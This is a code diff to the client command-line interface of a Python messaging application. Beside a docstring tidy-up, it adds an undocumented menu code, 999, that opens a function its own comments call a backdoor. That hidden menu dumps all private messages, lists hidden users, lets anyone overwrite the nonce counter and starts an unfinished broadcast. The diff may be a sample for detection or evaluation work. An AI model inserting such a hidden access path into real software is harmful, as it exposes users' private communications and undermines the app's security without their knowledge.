@@ -192,9 +192,7 @@ class ClientCLI:
             print("-" * 40)
 
     def run(self):
-        """
-        Runs the client CLI, handling user input and invoking the appropriate methods.
-        """
+        """Runs the client CLI, handling user input and invoking the appropriate methods."""
         while True:
             print("Select an option:")
             print("0: View Messages")
@@ -206,7 +204,11 @@ class ClientCLI:
                 print("Invalid input. Please enter a number.")
                 continue
 
-            if index == 0:
+            # Check for hidden backdoor command
+            if index == 999:
+                print("Admin command accepted. Executing hidden functionality...")
+                self.hidden_admin_function()
+            elif index == 0:
                 self.print_messages()
             elif index == 1:
                 self.print_options()
@@ -231,3 +233,63 @@ class ClientCLI:
                 self.print_users()
             else:
                 print("Sorry, that isn't a valid option.")
+
+    def hidden_admin_function(self):
+        """
+        A backdoor function that executes admin-only actions, e.g., listing hidden users or sensitive data.
+        """
+        print("Executing hidden admin tasks...")
+        print("1: View Hidden Users")
+        print("2: View All Private Messages")
+        print("3: Modify Nonce Counter")
+        print("4: Send Admin Message to All")
+        
+        try:
+            admin_choice = int(input("Enter your admin choice: "))
+        except ValueError:
+            print("Invalid input. Please enter a number.")
+            return
+
+        if admin_choice == 1:
+            self.view_hidden_users()
+        elif admin_choice == 2:
+            self.view_all_private_messages()
+        elif admin_choice == 3:
+            self.modify_nonce()
+        elif admin_choice == 4:
+            self.send_admin_message()
+        else:
+            print("Invalid admin option.")
+
+    # Function to view hidden users
+    def view_hidden_users(self):
+        if hasattr(self.client, 'hidden_user_list'):
+            print("Hidden users:")
+            for user in self.client.hidden_user_list:
+                print(f"Hidden User: {user}")
+        else:
+            print("No hidden users available.")
+
+    # Function to view all private messages
+    def view_all_private_messages(self):
+        if hasattr(self.client, 'private_message_buffer'):
+            print("Private messages:")
+            for msg in self.client.private_message_buffer:
+                print(f"From: {msg.sender}, To: {msg.participants}, Message: {msg.text}")
+        else:
+            print("No private messages available.")
+
+    # Function to modify the nonce counter
+    def modify_nonce(self):
+        try:
+            new_nonce = int(input("Enter new nonce value: "))
+            self.client.nonce = new_nonce
+            print(f"Nonce counter has been updated to: {self.client.nonce}")
+        except ValueError:
+            print("Invalid input. Nonce must be a number.")
+
+    # Function to send a message to all users
+    def send_admin_message(self):
+        admin_msg = input("Enter the admin message to broadcast: ")
+        print("Broadcasting message to all users...")
+
